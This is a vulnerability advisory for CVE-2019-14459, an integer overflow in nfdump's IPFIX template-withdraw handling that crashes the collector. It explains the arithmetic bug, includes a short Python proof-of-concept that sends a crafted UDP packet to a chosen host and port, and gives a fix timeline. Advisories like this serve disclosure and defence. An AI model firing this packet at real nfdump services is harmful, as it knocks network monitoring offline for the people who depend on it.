# CVE-2019-14459: Denial of Service in Nfdump
[![](https://img.shields.io/badge/Attack%20Vector-Remote-red?style=flat-square)]() [![](https://img.shields.io/badge/Privileges%20Required-None-red?style=flat-square)]() [![](https://img.shields.io/badge/User%20Interaction-No-red?style=flat-square)]()


__Vendor:__ Peter Haag<br>
__Vendor URL:__ https://github.com/phaag/nfdump<br>
__Versions affected:__ Nfdump <= 1.6.17<br>
__Discovered by:__ Juan Manuel Fernandez ([@TheXC3LL](https://twitter.com/TheXC3LL))<br>
__Public fix:__ Yes<br>
__Proof of Concept:__ Yes ([ref](https://github.com/blackarrowsec/advisories/blob/master/2019/CVE-2019-14459/)) <br>

## Summary
nfdump 1.6.17 and earlier is affected by an integer overflow in the function Process_ipfix_template_withdraw in ipfix.c that can be abused in order to crash the process remotely (denial of service).

## Details

An integer overflow at function  that can be abused in order to crash the process remotely (denial of service). The function `Process_ipfix_template_withdraw` uses size_left as uint32_t which is an unsigned integer, so if we have a size_left with value 1, when the substraction at line 1429 is done (`size_left -= 4;`), it will overflow and become 4294967293 (0xfffffffd). As this is a value higher than "4", the size check made at line 1443 (`if ( size_left < 4 ){(...) size_left = 0; (...)}`) will be bypassed. At this point we have a huge loop (`while ( size_left )`) where the pointer DataPtr will be increased by 4 in each iteration until it reaches an invalid memory address and segfaults.

```
import socket
import sys

packet = [
0x00, 0x0a, 0xc8, 0xc9, 0x00, 0x00, 0x0a, 0x20,
0x00, 0x5d, 0x53, 0x64, 0x02, 0x00, 0x00, 0x03,
0x00, 0x02, 0x00, 0x05, 0x11, 0x00
]

exploit = ""
for x in packet:
    exploit += chr(x)

print "[*] Nfcapd DoS - Integer Overflow at Process_ipfix_template_withdraw()"
print "[*] Rocket to: %s:%s" % (sys.argv[1], sys.argv[2])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(exploit, (sys.argv[1], int(sys.argv[2])))
 
```

## Impact
This vulnerability can be abused to crash the service and generate a Denial of Service.

## Recommendation
Update to last version.

## Timeline
* 07/07/2019 - Reported vulnerability to vendor
* 27/07/2019 - Fixed in Github
* 14/08/2019 - Security Release with fix (Nfdump 1.6.18)

#

[![](https://img.shields.io/badge/www-blackarrow.net-E5A505?style=flat-square)](https://www.blackarrow.net) [![](https://img.shields.io/badge/twitter-@BlackArrowSec-00aced?style=flat-square&logo=twitter&logoColor=white)](https://twitter.com/BlackArrowSec) [![](https://img.shields.io/badge/linkedin-@BlackArrowSec-0084b4?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/company/blackarrowsec/)
